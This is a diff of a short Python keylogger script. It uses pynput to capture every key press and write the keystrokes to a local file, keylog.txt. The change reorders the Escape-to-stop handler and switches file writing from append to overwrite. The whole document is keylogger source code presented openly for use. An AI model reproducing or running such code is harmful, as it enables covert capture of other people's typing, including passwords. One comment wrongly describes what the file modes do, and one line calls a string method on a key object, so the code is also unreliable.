@@ -18,8 +18,16 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+# write function here possibly?
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+# Key that will end the script, default is set to Escape (esc)
+
 def write_file(keys):
-    with open("keylog.txt", "a") as f:
+    with open("keylog.txt", "w") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
@@ -27,12 +35,6 @@ def write_file(keys):
             elif key.find("Key") == -1:
                 f.write(k)
 # This adds to a nice, clean log file for keylogging. If needed, change "w" to "a" (for creating a new file)
-
-
-def on_release(key):
-    if key == Key.esc:
-        return False
-# Key that will end the script, default is set to Escape (esc)
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
